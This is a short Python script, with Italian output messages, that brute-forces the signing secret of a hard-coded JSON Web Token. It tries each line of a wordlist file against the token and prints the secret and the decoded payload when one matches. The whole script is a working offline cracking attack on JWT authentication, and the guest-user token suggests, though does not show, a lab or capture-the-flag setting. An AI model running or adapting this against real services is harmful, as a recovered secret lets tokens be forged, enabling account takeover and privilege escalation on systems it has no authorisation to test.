import jwt
import sys


target_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Imd1ZXN0Iiwicm9sZSI6InVzZXIiLCJleHAiOjE3NDQwNDc4NjJ9.9YOV2xhUgg_o7xEu09yOEfKzzAMQiMooerIVDPZlalo"


wordlist_path = "mini.txt"

header = jwt.get_unverified_header(target_token)

with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
    for line in f:
        secret = line.strip()
        try:
            payload = jwt.decode(target_token, secret, algorithms=[header["alg"]])
            print(f"[+] Segreto trovato: {secret}")
            print(f"[+] Payload decodificato: {payload}")
            break
        except jwt.exceptions.InvalidSignatureError:
            continue
        except Exception as e:
            print(f"[-] Errore con {secret}: {e}")
